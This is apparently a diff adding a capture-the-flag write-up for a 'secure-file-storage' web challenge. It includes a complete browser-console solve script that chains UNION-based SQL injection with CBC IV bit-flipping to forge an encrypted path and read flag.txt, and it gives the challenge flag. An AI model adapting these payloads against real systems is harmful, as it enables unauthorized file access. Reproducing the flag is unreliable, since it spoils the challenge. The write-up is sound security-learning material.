@@ -1,0 +1,71 @@
+# secure-file-storage
+
+Simple SQL injection in `fetch_file_db`:
+```js path="challenge/application/database.py" range="86," open
+```
+
+However this does not automatically give LFI because the filename and filepath are encrypted:
+```js path="challenge/application/database.py" range="63,72" open
+```
+```js path="challenge/application/util.py" range="30,41" open
+```
+
+The issue with this kind of encryption (known IV, known plaintext) is that the IV is embedded directly and not verified,
+so we can inject a new IV to fake the first 16 bytes of any encrypted field.
+
+## solve script
+```js filename="solve.js" open
+async function inject(path, id) {
+    let res = await fetch(`https://uscybercombine-s4-web-secure-file-storage.chals.io/api/files/${path}`, {
+        "credentials": "include",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:127.0) Gecko/20100101 Firefox/127.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-User": "?1",
+            "Priority": "u=1",
+            "Pragma": "no-cache",
+            "Cache-Control": "no-cache",
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        "referrer": "https://uscybercombine-s4-web-secure-file-storage.chals.io/files",
+        "method": "POST",
+        "mode": "cors",
+        "body": new URLSearchParams({ "file_id": id })
+    });
+    return await res.text();
+}
+
+async function field(id, field) {
+    return JSON.parse(await inject("info", `2 UNION SELECT null, 3, ${field}, filename, filepath FROM File WHERE id = ${id}`)).message.file;
+}
+
+function pad(string) {
+    let padding = 16 - string.length % 16;
+    for (let i = string.length; i < 16; i++) {
+        string += String.fromCharCode(padding);
+    }
+    return string;
+}
+
+var file = await field(392, "filename");
+console.log(file);
+var filename = atob(file.title);
+var iv = filename.slice(0, 16);
+var enc = filename.slice(16);
+var padded = pad(file.filename);
+var niv = Array.from("/".repeat(8) + "flag.txt")
+    .map((ch, i) => iv.charCodeAt(i) ^ padded.charCodeAt(i) ^ ch.charCodeAt(0))
+    .map(ch => String.fromCharCode(ch))
+    .join("");
+var fake = btoa(niv + enc);
+var flag = await inject("download", `2 UNION SELECT null, 3, 'FAKE', '${fake}', filepath FROM file WHERE id = 392`);
+console.log(flag); 
+```
+I was lazy so it is meant to run in the browser console.
+
+## flag: `SIVUSCG{b1t_fl1pp3d_f1l3s}`
